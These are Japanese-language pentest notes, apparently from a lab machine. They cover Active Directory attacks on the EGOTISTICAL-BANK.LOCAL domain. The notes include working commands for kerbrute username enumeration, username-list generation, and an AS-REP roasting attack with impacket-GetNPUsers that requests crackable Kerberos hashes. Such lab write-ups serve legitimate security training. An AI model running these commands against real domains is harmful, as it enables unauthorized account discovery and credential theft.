## kerbrute

- コマンド:
  ```bash
  ./kerbrute_linux_amd64 -d egotisticalbank --dc 10.10.10.175 userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
  ```

### Kerberos事前認証無効アカウントの調査

#### Windows用のusernameファイルの作成
- 事前にkerbruteやenum4linux等でDCの名前のフォーマットを調べ、そのフォーマットに対応するようにファイルを作成します。

  - ファーストネーム・ラストネーム形式
    ```bash
    /home/kali/github/username-anarchy/username-anarchy --input-file ./users.txt --select-format first.last
    ```
    ![First.Last Format](https://github.com/user-attachments/assets/9ae9aadf-5c86-48fa-a248-013025577acc)

  - ファーストネームイニシャル・ラストネーム形式
    ```bash
    /home/kali/github/username-anarchy/username-anarchy --input-file ./users_Initial_lastname.txt --select-format flast
    ```
    ![FLast Format](https://github.com/user-attachments/assets/9eec67cc-3dc6-4a01-b2da-56d41336eee2)

  - 注意: 画面出力しかされないので、これらを含むテキストファイルを改めて作成します。

### AS-REProast攻撃
- コマンド:
  ```bash
  impacket-GetNPUsers -usersfile users_Initial_lastname.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.10.175 'EGOTISTICAL-BANK.LOCAL/'
  ```
  ![ASREProast Attack](https://github.com/user-attachments/assets/95fd7aa4-3a2b-435c-aca6-1893f741c00a)

